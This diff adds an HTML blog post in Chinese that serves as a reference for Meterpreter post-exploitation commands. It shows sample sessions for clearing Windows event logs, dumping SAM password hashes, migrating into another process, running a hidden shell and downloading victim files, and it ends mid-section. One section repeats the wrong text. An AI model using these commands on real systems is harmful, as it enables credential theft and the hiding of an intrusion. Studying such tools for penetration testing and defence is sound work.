@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+<link rel="stylesheet" href="https://fonts.cat.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Times New Roman:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="METERPRETER命令用法所有的命令都会涉及到，若没有，实践是检验的唯一标准。HELP展示帮助菜单：">
+<meta name="keywords" content="meterpreter,Penetration">
+<meta property="og:type" content="article">
+<meta property="og:title" content="meterpreter常用命令">
+<meta property="og:url" content="https://spwpun.github.io/2019/12/29/meterpreter常用命令/index.html">
+<meta property="og:site_name" content="Spwpun&#39;s Blog">
+<meta property="og:description" content="METERPRETER命令用法所有的命令都会涉及到，若没有，实践是检验的唯一标准。HELP展示帮助菜单：">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://spwpun.github.io/2019/12/29/meterpreter常用命令/Clearev_before.png">
+<meta property="og:image" content="https://spwpun.github.io/2019/12/29/meterpreter常用命令/Clearev_after.png">
+<meta property="og:updated_time" content="2019-12-29T17:03:40.288Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="meterpreter常用命令">
+<meta name="twitter:description" content="METERPRETER命令用法所有的命令都会涉及到，若没有，实践是检验的唯一标准。HELP展示帮助菜单：">
+<meta name="twitter:image" content="https://spwpun.github.io/2019/12/29/meterpreter常用命令/Clearev_before.png">
+  <link rel="canonical" href="https://spwpun.github.io/2019/12/29/meterpreter常用命令/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>meterpreter常用命令 | Spwpun's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Spwpun's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>Search</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/spwpun" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2019/12/29/meterpreter常用命令/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Demen Lee">
+      <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Spwpun's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">meterpreter常用命令
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2019-12-29 18:22:56" itemprop="dateCreated datePublished" datetime="2019-12-29T18:22:56+08:00">2019-12-29</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-12-30 01:03:40" itemprop="dateModified" datetime="2019-12-30T01:03:40+08:00">2019-12-30</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/工具使用/" itemprop="url" rel="index"><span itemprop="name">工具使用</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span id="/2019/12/29/meterpreter常用命令/" class="post-meta-item leancloud_visitors" data-flag-title="meterpreter常用命令" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+        
+      
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/12/29/meterpreter常用命令/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2019/12/29/meterpreter常用命令/" itemprop="commentCount"></span></a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="METERPRETER命令用法"><a href="#METERPRETER命令用法" class="headerlink" title="METERPRETER命令用法"></a>METERPRETER命令用法</h2><p>所有的命令都会涉及到，若没有，实践是检验的唯一标准。</p><h2 id="HELP"><a href="#HELP" class="headerlink" title="HELP"></a>HELP</h2><p>展示帮助菜单：</p><a id="more"></a>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             Help menu</span><br><span class="line">    background    Backgrounds the current session</span><br><span class="line">    channel       Displays information about active channels</span><br><span class="line">...snip...</span><br></pre></td></tr></table></figure>
+
+<h2 id="BACKGROUND"><a href="#BACKGROUND" class="headerlink" title="BACKGROUND"></a>BACKGROUND</h2><p>把当前session放到后台，然后返回‘msf’提示的命令行，如果要返回session，使用sessions命令选择：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CAT"><a href="#CAT" class="headerlink" title="CAT"></a>CAT</h2><p>查看文件内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat</span><br><span class="line">Usage: cat file</span><br><span class="line"></span><br><span class="line">Example usage:</span><br><span class="line">meterpreter &gt; cat edit.txt</span><br><span class="line">What you talkin<span class="string">' about Willis</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="CD-AND-PWD"><a href="#CD-AND-PWD" class="headerlink" title="CD AND PWD"></a>CD AND PWD</h2><p>切换目录，查看当前目录：</p>
+<p>参数:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>:	Path of the folder to change to</span><br><span class="line"><span class="built_in">pwd</span>:	None required</span><br></pre></td></tr></table></figure>
+
+<p>示例:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; pwd</span><br><span class="line">c:\</span><br><span class="line">meterpreter &gt; cd c:\windows</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">c:\windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CLEAREV"><a href="#CLEAREV" class="headerlink" title="CLEAREV"></a>CLEAREV</h2><p>清除Windows上的日志，（Clear Event），Windows上的日志可以使用事件查看器（Event Viewer）来查看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>:	Path of the folder to change to</span><br><span class="line"><span class="built_in">pwd</span>:	None required</span><br></pre></td></tr></table></figure>
+
+<p>Example usuage:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">c:\</span><br><span class="line">meterpreter &gt; <span class="built_in">cd</span> c:\windows</span><br><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">c:\windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CLEAREV-1"><a href="#CLEAREV-1" class="headerlink" title="CLEAREV"></a>CLEAREV</h2><p>The <strong>clearev</strong> command will clear the <em>Application</em>, <em>System</em>, and <em>Security</em> logs on a <em>Windows</em> system. There are no options or arguments.</p>
+<p><a href="https://www.offensive-security.com/wp-content/uploads/2015/05/Clearev_before.png" target="_blank" rel="noopener"><img src="//spwpun.github.io/2019/12/29/meterpreter常用命令/Clearev_before.png" alt="Before using Meterpreter to clear the logs | Metasploit Unleashed"></a></p>
+<p>上面是没有使用<strong>clearev</strong>命令清除前。</p>
+<p>用法:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev</span><br><span class="line">[*] Wiping 97 records from Application...</span><br><span class="line">[*] Wiping 415 records from System...</span><br><span class="line">[*] Wiping 0 records from Security...</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.offensive-security.com/wp-content/uploads/2015/05/Clearev_after.png" target="_blank" rel="noopener"><img src="//spwpun.github.io/2019/12/29/meterpreter常用命令/Clearev_after.png" alt="After using Meterpreter to clear the logs | Metasploit Unleashed"></a></p>
+<p>上图是清除后的Windows系统日志。</p>
+<h2 id="注意在操作Windows路径时应该使用两个反斜杠"><a href="#注意在操作Windows路径时应该使用两个反斜杠" class="headerlink" title="注意在操作Windows路径时应该使用两个反斜杠"></a>注意在操作Windows路径时应该使用两个反斜杠</h2><p>The <strong>download</strong> command downloads a file from the remote machine. Note the use of the double-slashes when giving the Windows path.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; download c:\\boot.ini</span><br><span class="line">[*] downloading: c:\boot.ini -&gt; c:\boot.ini</span><br><span class="line">[*] downloaded : c:\boot.ini -&gt; c:\boot.ini/boot.ini</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="EDIT"><a href="#EDIT" class="headerlink" title="EDIT"></a>EDIT</h2><p>使用<strong>vim</strong> 编辑文件：</p>
+<p>示例:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Documents and Settings\Administrator\Desktop</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">.</span><br><span class="line">...snip...</span><br><span class="line">.</span><br><span class="line">100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; edit edit.txt</span><br></pre></td></tr></table></figure>
+
+<p>查看更高级的用法.<a href="http://www.vim.org/" target="_blank" rel="noopener">http://www.vim.org/</a></p>
+<h2 id="EXECUTE"><a href="#EXECUTE" class="headerlink" title="EXECUTE"></a>EXECUTE</h2><p>在目标机器上执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -f cmd.exe -i -H</span><br><span class="line">Process 38320 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="GETUID"><a href="#GETUID" class="headerlink" title="GETUID"></a>GETUID</h2><p>返回目标主机的服务器名字：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="HASHDUMP"><a href="#HASHDUMP" class="headerlink" title="HASHDUMP"></a>HASHDUMP</h2><p>dump出Windows上SAM数据库的内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/hashdump </span><br><span class="line"></span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line">Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::</span><br><span class="line">dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::</span><br><span class="line">SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::</span><br><span class="line">victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="IDLETIME"><a href="#IDLETIME" class="headerlink" title="IDLETIME"></a>IDLETIME</h2><p>返回远程主机用户在线的时长：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; idletime</span><br><span class="line">User has been idle <span class="keyword">for</span>: 5 hours 26 mins 35 secs</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="IPCONFIG"><a href="#IPCONFIG" class="headerlink" title="IPCONFIG"></a>IPCONFIG</h2><p>查看远程主机的网络配置情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">MS TCP Loopback interface</span><br><span class="line">Hardware MAC: 00:00:00:00:00:00</span><br><span class="line">IP Address  : 127.0.0.1</span><br><span class="line">Netmask     : 255.0.0.0</span><br><span class="line"></span><br><span class="line">AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport</span><br><span class="line">Hardware MAC: 00:0c:29:10:f5:15</span><br><span class="line">IP Address  : 192.168.1.104</span><br><span class="line">Netmask     : 255.255.0.0</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="LPWD-AND-LCD"><a href="#LPWD-AND-LCD" class="headerlink" title="LPWD AND LCD"></a>LPWD AND LCD</h2><p>查看本地的当前目录和改变本地的目录，即攻击者的目录：</p>
+<p>参数:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lpwd:		None required</span><br><span class="line">lcd:		Destination folder</span><br></pre></td></tr></table></figure>
+
+<p>示例:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; lpwd</span><br><span class="line">/root</span><br><span class="line"></span><br><span class="line">meterpreter &gt; lcd MSFU</span><br><span class="line">meterpreter &gt; lpwd</span><br><span class="line">/root/MSFU</span><br><span class="line"></span><br><span class="line">meterpreter &gt; lcd /var/www</span><br><span class="line">meterpreter &gt; lpwd</span><br><span class="line">/var/www</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="LS"><a href="#LS" class="headerlink" title="LS"></a>LS</h2><p>列出远程主机当前目录下的文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Documents and Settings\victim</span><br><span class="line">=========================================</span><br><span class="line"></span><br><span class="line">Mode              Size     Type  Last modified                   Name</span><br><span class="line">----              ----     ----  -------------                   ----</span><br><span class="line">40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .</span><br><span class="line">40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..</span><br><span class="line">100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel</span><br><span class="line">40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data</span><br><span class="line">...snip...</span><br></pre></td></tr></table></figure>
+
+<h2 id="MIGRATE"><a href="#MIGRATE" class="headerlink" title="MIGRATE"></a>MIGRATE</h2><p>注入到另外一个进程中去：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/migrate </span><br><span class="line"></span><br><span class="line">[*] Running module against V-MAC-XP</span><br><span class="line">[*] Current server process: svchost.exe (1076)</span><br><span class="line">[*] Migrating to explorer.exe...</span><br><span class="line">[*] Migrating into process ID 816</span><br><span class="line">[*] New server process: Explorer.EXE (816)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><p>列出目标当前正在运行的进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process list</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">    PID   Name                  Path</span><br><span class="line">    ---   ----                  ----</span><br><span class="line">    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe</span><br><span class="line">    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe</span><br><span class="line">    288   snmp.exe              C:\WINDOWS\System32\snmp.exe</span><br><span class="line">...snip...</span><br></pre></td></tr></table></figure>
+
+<h2 id="RESOURCE"><a href="#RESOURCE" class="headerlink" title="RESOURCE"></a>RESOURCE</h2><p><strong>resource</strong> 命令会一行一行地执行文本文件里的meterpreter命令，默认情况下，命令是在目标机的当前目录下执行，而resource文件则是在攻击机本地工作目录下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; resource </span><br><span class="line">Usage: resource path1 path2Run the commands stored <span class="keyword">in</span> the supplied files.</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<p>参数:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">path1:		包含要执行的命令的文件的位置</span><br><span class="line">Path2Run:	在文件中找到的执行命令的位置</span><br></pre></td></tr></table></figure>
+
+<p><strong>示例</strong><br>使用的resource文件如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat resource.txt</span></span><br><span class="line">ls</span><br><span class="line">background</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>执行resource命令:</p>
